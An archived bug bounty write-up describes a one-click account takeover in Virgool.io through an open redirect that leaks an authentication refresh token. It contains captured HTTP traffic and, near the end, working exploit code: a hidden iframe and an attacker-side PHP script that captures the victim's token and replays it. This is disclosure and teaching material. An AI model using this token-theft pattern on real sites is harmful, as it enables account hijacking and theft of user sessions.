---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-27_1-click-account-takeover-in-virgoolio-a-nice-case-study.md
original_filename: 2019-06-27_1-click-account-takeover-in-virgoolio-a-nice-case-study.md
title: 1-Click Account Takeover in Virgool.io — a Nice Case Study
category: documents
detected_topics:
- jwt
- xss
- command-injection
- otp
- csrf
- clickjacking
tags:
- imported
- documents
- jwt
- xss
- command-injection
- otp
- csrf
- clickjacking
language: en
raw_sha256: 8ab4b24949537bedde4539f57ab9eedcc51c3ddd3cf71f0b90c808c94b7f0011
text_sha256: 83b44c4a22956c51ac7737dd02dab6b435e31554cd892f68de9aa2a090ae6a15
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# 1-Click Account Takeover in Virgool.io — a Nice Case Study

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-27_1-click-account-takeover-in-virgoolio-a-nice-case-study.md
- Source Type: markdown
- Detected Topics: jwt, xss, command-injection, otp, csrf, clickjacking
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `8ab4b24949537bedde4539f57ab9eedcc51c3ddd3cf71f0b90c808c94b7f0011`
- Text SHA256: `83b44c4a22956c51ac7737dd02dab6b435e31554cd892f68de9aa2a090ae6a15`


## Content

---
title: "1-Click Account Takeover in Virgool.io — a Nice Case Study"
url: "https://medium.com/@y.shahinzadeh/1-click-account-takeover-in-virgool-io-a-nice-case-study-6bfc3cb98ef2"
authors: ["Yashar Shahinzadeh (@YShahinzadeh)"]
bugs: ["Account takeover", "Open redirect"]
publication_date: "2019-06-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5181
scraped_via: "browseros"
---

# 1-Click Account Takeover in Virgool.io — a Nice Case Study

1-Click Account Takeover in Virgool.io — a Nice Case Study
Yasho
Follow
5 min read
·
Jun 27, 2019

435

Hello, Virgool is a light, Iranian version of meduim.com, recently I found 1-click account takeover vulnerability in their product.

Press enter or click to view image in full size

Virgool gives users the capability of domain parking. So the site.com can be a mirror of virgool.io/myname . I was looking at the https://tech.cafebazaar.ir which was hosted on the Virgool. I saw the source code, and the eye-catching part was the login link:

https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;status=login

I clicked, I logged-in in Virgool, then I got redirected to the https://tech.cafebazaar.ir again. Let’s see the flow:

Click on the login from https://tech.cafebazaar.ir page:

GET /authorize?redirectedFrom=https://tech.cafebazaar.ir&status=login HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://tech.cafebazaar.ir/
Connection: close
Cookie: PHPSESSID=REDUCTED; rec=REDUCTED; XSRF-TOKEN=REDUCTED; vrgl_sess=REDUCTED; _ga=GA1.2.1769807866.1561463323; _gid=GA1.2.215640833.1561463323; _vcfg=%7B%22tpcs_c%22%3A49%7D; nightmode={%22value%22:0%2C%22userMenu%22:0%2C%22active%22:0}; __cfduid=daf3ea276c68e9eb2200e84f71f8b3ea61561463882; _gat_UA-96394274-1=1
Upgrade-Insecure-Requests: 1

The response:

HTTP/1.1 302 Found
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 05:45:35 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Location: https://virgool.io/login
Set-Cookie: XSRF-TOKEN=REDUCTED; expires=Thu, 27-Jun-2019 05:45:35 GMT; Max-Age=86400; path=/
Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 05:45:35 GMT; Max-Age=86400; path=/; httponly
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' https://www.google-analytics.com stats.vstat.ir heapanalytics.com cdn.iframe.ly https://geoip-db.com; font-src 'self' data: https://virgool.io;  img-src blob: data: https: 'self' files.virgool.io https://www.google-analytics.com; object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: https://virgool.io 'unsafe-eval' 'unsafe-inline' www.googletagmanager.com https://www.google-analytics.com js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly https://cdn.iframe.ly https://geoip-db.com  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly https://cdn.iframe.ly  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; 
Strict-Transport-Security: max-age=15724800; includeSubDomains
Content-Length: 5830

The login page, after credentials submission:

POST /api/v1.2/login HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://virgool.io/login
X-XSRF-TOKEN: REDUCTED
Content-Type: multipart/form-data; boundary=---------------------------1803676204095613341172964359
Content-Length: 319
Connection: close
Cookie: PHPSESSID=REDUCTED; rec=REDUCTED; XSRF-TOKEN=REDUCTED%3D%3D; vrgl_sess=REDUCTED; _ga=GA1.2.1769807866.1561463323; _gid=GA1.2.215640833.1561463323; _vcfg=%7B%22tpcs_c%22%3A49%7D; nightmode={%22value%22:0%2C%22userMenu%22:0%2C%22active%22:0}; __cfduid=daf3ea276c68e9eb2200e84f71f8b3ea61561463882; _gat_UA-96394274-1=1
-----------------------------1803676204095613341172964359
Content-Disposition: form-data; name="username"
y.shahinzadeh@gmail.com
-----------------------------1803676204095613341172964359
Content-Disposition: form-data; name="password"
REDUCTED
-----------------------------1803676204095613341172964359--

The response:

HTTP/1.1 200 OK
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 05:45:55 GMT
Content-Type: application/json
Connection: close
Vary: Accept-Encoding
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 861
Set-Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.REDUCTED; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/
Set-Cookie: jwts=REDUCTED; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/; secure; httponly
Set-Cookie: refreshed_token=REDUCTED; expires=Wed, 26-Jun-2019 06:05:55 GMT; Max-Age=1200; path=/; secure
Set-Cookie: uid=sb5uevdkih3r; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/
Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 05:45:55 GMT; Max-Age=86400; path=/; httponly
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' https://www.google-analytics.com stats.vstat.ir heapanalytics.com cdn.iframe.ly https://geoip-db.com; font-src 'self' data: https://virgool.io;  img-src blob: data: https: 'self' files.virgool.io https://www.google-analytics.com; object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: https://virgool.io 'unsafe-eval' 'unsafe-inline' www.googletagmanager.com https://www.google-analytics.com js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly https://cdn.iframe.ly https://geoip-db.com  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly https://cdn.iframe.ly  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; 
Strict-Transport-Security: max-age=15724800; includeSubDomains
Content-Length: 612
{"success":true,"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.REDUCTED.juAVldUazb6ZTMCopRaXzWQGh-6EYnxXjUd8uEK5jDA","previous_url":"https:\/\/virgool.io\/authorize?redirectedFrom=https:\/\/tech.cafebazaar.ir&status=checked","user":{"name":"YShahinzadeh","activated":1,"username":"YShahinzadeh","avatar":"https:\/\/files.virgool.io\/upload\/users\/9091\/avatar\/1xRXC6.png"}}

Nothing useful here. The idea of manipulating the login link (https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;status=login) was not interesting enough because of:

https://virgool.io/authorize?redirectedFrom=https://test.com&status=login

There will be a useless open redirect after the user logged-in (honestly I didn’t check this vector, I’m not sure about the open redirect after login sequence). Here I tested an attack scenario:

What if a user has already logged-in, clicks on the authorize link?

The mechanism was:

GET /authorize?redirectedFrom=http://tech.cafebazaar.ir&status=login HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: REDUCTED
Upgrade-Insecure-Requests: 1

The response was surprising:

HTTP/1.1 302 Found
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 08:34:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Location: http://tech.cafebazaar.ir/authorize-token?token=sa5uevekit3r&redirectedFrom=http://tech.cafebazaar.ir&nightmode={"value":0,"userMenu":0,"active":0}
Set-Cookie: XSRF-TOKEN=REDUCTED; expires=Thu, 27-Jun-2019 08:34:53 GMT; Max-Age=86400; path=/
Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 08:34:53 GMT; Max-Age=86400; path=/; httponly
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' https://www.google-analytics.com stats.vstat.ir heapanalytics.com cdn.iframe.ly https://geoip-db.com; font-src 'self' data: https://virgool.io;  img-src blob: data: https: 'self' files.virgool.io https://www.google-analytics.com; object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: https://virgool.io 'unsafe-eval' 'unsafe-inline' www.googletagmanager.com https://www.google-analytics.com js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly https://cdn.iframe.ly https://geoip-db.com  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly https://cdn.iframe.ly  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; 
Strict-Transport-Security: max-age=15724800; includeSubDomains
Content-Length: 6482

Wait, there wasn’t any login page, just a token to refresh the authentication (updating JWT tokens). Here if I would take-over any account if I could steal that token. How was it possible? by an open redirect :)

Get Yasho’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The first shot was successful:

GET /authorize?redirectedFrom=http://localhost/&status=login HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
...

The response:

HTTP/1.1 302 Found
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 08:42:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
Location: http://localhost/authorize-token?token=sb5uevdkih3r&redirectedFrom=http://localhost/&nightmode={"value":0,"userMenu":0,"active":0}
...

Done, 1-lick account takeover. Here is the exploit code:

<style>
iframe {
  visibility: hidden;
  position: absolute;
  left: 0; top: 0;
  height:0; width:0;
  border: none;
}
</style>
<center><img src="troll.jpg"></center><iframe src="https://virgool.io/authorize?redirectedFrom=http://localhost/v/g.php&status=login"></iframe>

In the attacker’s box:

<?php
file_put_contents('hacked.html', '<html><meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding"><script>document.location=\'http://virgool.io/authorize-token?token=' . $_GET['token'] . '&redirectedFrom=https://virgool.io&nightmode={"value":0,"userMenu":0,"active":0}\'</script>');
?>

The attacker should trick the user to visit their website, once the user visits the attacker’s website:

GET /authorize-token?token=sa5uevekit3r&redirectedFrom=http://localhost/v/g.php&nightmode={%22value%22:0,%22userMenu%22:0,%22active%22:0} HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/v/
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

They send the token to the attacker and their Virgool account is compromised. Here I should thank Virgool for their fast response and bounty. Here is the POC video sent to the Virgool:
